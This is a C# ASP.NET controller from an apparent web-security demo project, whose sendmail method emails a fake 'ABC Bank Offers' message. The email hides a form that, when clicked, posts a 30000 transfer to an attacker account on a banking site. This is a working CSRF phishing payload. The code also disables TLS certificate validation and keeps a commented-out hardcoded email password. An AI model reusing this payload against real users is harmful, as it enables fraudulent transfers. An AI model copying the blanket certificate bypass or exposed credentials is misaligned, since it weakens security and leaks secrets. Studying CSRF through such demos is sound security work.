using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Logging;
using WebSecurityProj.Models;

namespace WebSecurityProj.Controllers
{
    public class HomeController : Controller
    {
        private readonly ILogger<HomeController> _logger;

        public HomeController(ILogger<HomeController> logger)
        {
            _logger = logger;
        }

        public IActionResult Index()
        {

            return View();
        }

        public IActionResult Privacy()
        {
            return View();
        }

        [ResponseCache(Duration = 0, Location = ResponseCacheLocation.None, NoStore = true)]
        public IActionResult Error()
        {
            return View(new ErrorViewModel { RequestId = Activity.Current?.Id ?? HttpContext.TraceIdentifier });
        }

        private bool RemoteServerCertificateValidationCallback(object sender, System.Security.Cryptography.X509Certificates.X509Certificate certificate, System.Security.Cryptography.X509Certificates.X509Chain chain, System.Net.Security.SslPolicyErrors sslPolicyErrors)
        {
            //Console.WriteLine(certificate);
            return true;
        }

        private void sendmail()
        {

            try
            {
                SmtpClient smtp = new SmtpClient();


                smtp.Port = 587;
                smtp.Host = "mail.g2techsoft.com";
                smtp.EnableSsl = true;
                smtp.UseDefaultCredentials = false;
                //smtp.Credentials = new NetworkCredential("jayanth@g2techsoft.com", "G2tech@12345");
                smtp.DeliveryMethod = SmtpDeliveryMethod.Network;
                System.Net.ServicePointManager.ServerCertificateValidationCallback = new System.Net.Security.RemoteCertificateValidationCallback(RemoteServerCertificateValidationCallback);

                MailMessage mail = new MailMessage();
                System.Net.ServicePointManager.ServerCertificateValidationCallback = new System.Net.Security.RemoteCertificateValidationCallback(RemoteServerCertificateValidationCallback);
                mail.From = new MailAddress("np-reply@abc.com");
                mail.IsBodyHtml = true;
                mail.To.Add("jayanth_pune@yahoo.com");
                mail.Subject = "Raining Offers";
                mail.Body = @"<html>
<body>
<style>
button:hover{
cursor:pointer;
}

h2{
color:DarkBlue;
}

#browse{
background-color:blue;
}
</style>
<h2>
ABC Bank Offers!!!
</h2>

<form action='http://www.securedbanksite.com:85/Account/Transfer' method=post>
	 <input type=hidden name='amount' value='30000' /> <input type=hidden name='ToAccountNumber' value='445522' />
         <input type=hidden name='ToAccountName' value='Hacker Name' />
<button type='submit'>
	<img src='https://raw.githubusercontent.com/TJayanth/StaticFiles/master/OffersEmail.png' width='100%' style='display:block; border:none;'>
</button>
<br />
<br />
<hr />
<h6>
  *Terms and conditions apply. Interest cost on the facility provided is borne by the respective brands/ merchants. Credit at the sole discretion of ABC Bank Ltd. and subject to guidelines issued by RBI from time to time. Delivery of the purchases will be subject to guidelines issued by the local and government authorities.
</h3>
</body>
</html>
";
                smtp.Send(mail);
            }
            catch (Exception ex)
            {

                throw;
            }
        }
    }
}
